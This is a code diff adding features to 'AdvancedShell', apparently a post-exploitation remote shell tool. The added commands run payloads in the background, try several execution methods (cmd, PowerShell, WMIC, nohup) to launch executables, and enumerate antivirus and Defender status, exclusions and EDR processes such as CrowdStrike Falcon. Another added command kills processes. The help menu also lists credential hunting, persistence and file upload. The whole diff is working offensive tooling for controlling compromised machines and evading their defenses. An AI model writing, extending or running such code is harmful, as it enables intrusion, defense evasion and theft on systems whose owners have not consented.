@@ -672,6 +672,97 @@ class AdvancedShell:
         if o:print(o)
         else:print(f"{R}Could not read file{W}")
 
+    def post_bg(self,cmd):
+        """Run a command in the background (fire & forget, no output)."""
+        fp=cmd.replace('\\','/') if self.target_os=='windows' else cmd
+        if self.target_os=='windows':
+            o=self.execute(f'start /b cmd /c "{fp}" >nul 2>&1 & echo BG_OK')
+        else:
+            o=self.execute(f'nohup {fp} >/dev/null 2>&1 & echo BG_OK')
+        if o and 'BG_OK' in o:print(f"{G}[+] Started in background{W}")
+        else:print(f"{Y}[!] Background start result: {o or 'no output'}{W}")
+
+    def post_exec(self,filepath,args=''):
+        """Smart executable launcher — tries multiple execution methods."""
+        fp=filepath.replace('\\','/') if self.target_os=='windows' else filepath
+        methods=[]
+        if self.target_os=='windows':
+            methods=[
+                ('Direct',f'"{fp}" {args} 2>&1'),
+                ('cmd /c',f'cmd /c "{fp}" {args} 2>&1'),
+                ('PowerShell',f'powershell -c "& \'{fp}\' {args}" 2>&1'),
+                ('WMIC',f'wmic process call create "{fp} {args}" 2>&1'),
+                ('Background',f'start /b "" "{fp}" {args} & echo EXEC_STARTED'),
+            ]
+        else:
+            methods=[
+                ('Direct',f'"{fp}" {args} 2>&1'),
+                ('chmod+run',f'chmod +x "{fp}" && "{fp}" {args} 2>&1'),
+                ('sh -c',f'sh -c "{fp} {args}" 2>&1'),
+                ('Background',f'nohup "{fp}" {args} >/dev/null 2>&1 & echo EXEC_STARTED'),
+            ]
+        for name,cmd in methods:
+            print(f"  {Y}[*] Trying {name}...{W}",end=' ',flush=True)
+            o=self.execute(cmd)
+            if o and '[-]' not in o:
+                if 'EXEC_STARTED' in o:
+                    print(f"{G}started in background{W}")
+                elif o.strip():
+                    print(f"{G}got output{W}")
+                    print(o)
+                else:
+                    print(f"{Y}no output (may have run){W}")
+                return
+            else:
+                print(f"{R}failed{W}")
+        print(f"{R}[!] All execution methods failed. Check AV with .av{W}")
+
+    def post_av(self):
+        """Check antivirus status."""
+        print(f"{Y}[*] Checking AV status...{W}")
+        if self.target_os=='windows':
+            cmds=[
+                ("Defender Status","powershell -c \"Get-MpComputerStatus | Select-Object -Property RealTimeProtectionEnabled,AntivirusEnabled,AMServiceEnabled | Format-List\""),
+                ("AV Products","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState /format:list 2>nul || echo No SecurityCenter2"),
+                ("Defender Exclusions","powershell -c \"Get-MpPreference | Select-Object -Property ExclusionPath,ExclusionExtension,ExclusionProcess | Format-List\" 2>nul"),
+                ("Defender Processes","tasklist | findstr -i \"MsMpEng msmpeng NisSrv nissrv MpCmdRun\""),
+            ]
+            for label,c in cmds:
+                o=self.execute(c)
+                if o and '[-]' not in o:
+                    lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
+                    if lines:
+                        print(f"  {C}{label}:{W}")
+                        for l in lines:print(f"    {l.strip()}")
+                else:print(f"  {C}{label}:{W} {R}N/A{W}")
+        else:
+            cmds=[
+                ("AV Processes","ps aux | grep -iE 'clam|sophos|eset|avg|avast|crowdstrike|falcon|carbon' | grep -v grep"),
+                ("Security tools","which aa-status apparmor_status sestatus 2>/dev/null"),
+                ("SELinux","getenforce 2>/dev/null || echo N/A"),
+            ]
+            for label,c in cmds:
+                o=self.execute(c)
+                if o and '[-]' not in o and o.strip():
+                    print(f"  {C}{label}:{W}")
+                    for l in o.strip().split('\n'):print(f"    {l.strip()}")
+                else:print(f"  {C}{label}:{W} {R}none found{W}")
+
+    def post_kill(self,target):
+        """Kill a process by PID or name."""
+        if self.target_os=='windows':
+            if target.isdigit():
+                o=self.execute(f'taskkill /PID {target} /F')
+            else:
+                o=self.execute(f'taskkill /IM "{target}" /F')
+        else:
+            if target.isdigit():
+                o=self.execute(f'kill -9 {target}')
+            else:
+                o=self.execute(f'pkill -9 -f "{target}"')
+        if o:print(o)
+        else:print(f"{G}[+] Kill command sent{W}")
+
     def post_fullinfo(self):
         """Comprehensive enumeration."""
         self.post_users()
@@ -710,6 +801,10 @@ class AdvancedShell:
   {G}.shares{W}           Network shares         {G}.firewall{W}         Firewall rules
   {G}.secrets{W}          Credential hunting     {G}.persist{W}          Persistence check
   {G}.software{W}         Installed software     {G}.cat{W} path         Read file
+
+{BOLD}Execution:{W}
+  {G}.exec{W} path [args] Smart exe launcher     {G}.bg{W} cmd           Background run
+  {G}.av{W}               AV/Defender status     {G}.kill{W} pid|name    Kill process
   {G}.exit{W}             Exit
 """)
 
@@ -846,6 +941,21 @@ class AdvancedShell:
                     elif cmd=='.software':self.post_software()
                     elif cmd.startswith('.cat '):
                         p=cmd.split(' ',1);self.post_cat(p[1]) if len(p)>1 else print('Usage: .cat <filepath>')
+                    elif cmd.startswith('.bg '):
+                        p=cmd.split(' ',1)
+                        if len(p)>1:self.post_bg(p[1])
+                        else:print('Usage: .bg <command>')
+                    elif cmd.startswith('.exec '):
+                        p=cmd.split(None,2)
+                        if len(p)>1:
+                            fp=p[1];args=p[2] if len(p)>2 else ''
+                            self.post_exec(fp,args)
+                        else:print('Usage: .exec <path> [args]')
+                    elif cmd=='.av':self.post_av()
+                    elif cmd.startswith('.kill '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:self.post_kill(p[1])
+                        else:print('Usage: .kill <pid|name>')
                     elif cmd.startswith('.upload') or cmd.startswith('.ul'):
                         p=cmd.split()
                         if len(p)<3:print(f"Usage: .upload <local_path> <remote_path>");continue
